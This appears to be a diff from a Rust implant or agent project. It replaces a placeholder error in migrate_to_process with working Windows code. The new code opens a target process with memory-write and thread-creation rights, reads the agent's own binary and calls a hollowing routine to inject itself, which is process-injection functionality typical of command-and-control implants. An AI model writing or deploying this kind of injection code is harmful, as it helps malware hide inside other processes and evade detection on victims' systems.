@@ -58,11 +58,33 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
 
 #[cfg(windows)]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
-    tracing::warn!(
-        target_pid,
-        "Injection into an existing process is not yet implemented; returning a controlled error."
-    );
-    anyhow::bail!("Injection into an existing process is not yet implemented.")
+    use winapi::um::processthreadsapi::OpenProcess;
+    use winapi::um::handleapi::CloseHandle;
+    use winapi::um::winnt::{
+        PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_CREATE_THREAD,
+    };
+
+    // Read the current agent's own executable so we can re-inject ourselves.
+    let agent_path = std::env::current_exe()
+        .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
+    let payload = std::fs::read(&agent_path)
+        .map_err(|e| anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display()))?;
+
+    let access =
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD;
+    let process = unsafe { OpenProcess(access, 0, target_pid) };
+    if process.is_null() {
+        anyhow::bail!(
+            "OpenProcess(pid={target_pid}) failed: {}",
+            std::io::Error::last_os_error()
+        );
+    }
+
+    let result = hollowing::inject_into_process(process, &payload);
+    unsafe { CloseHandle(process) };
+    result.map_err(|e| anyhow::anyhow!("inject_into_process(pid={target_pid}) failed: {e}"))?;
+    tracing::info!(target_pid, "MigrateAgent: agent injected successfully");
+    Ok(())
 }
 
 #[cfg(test)]
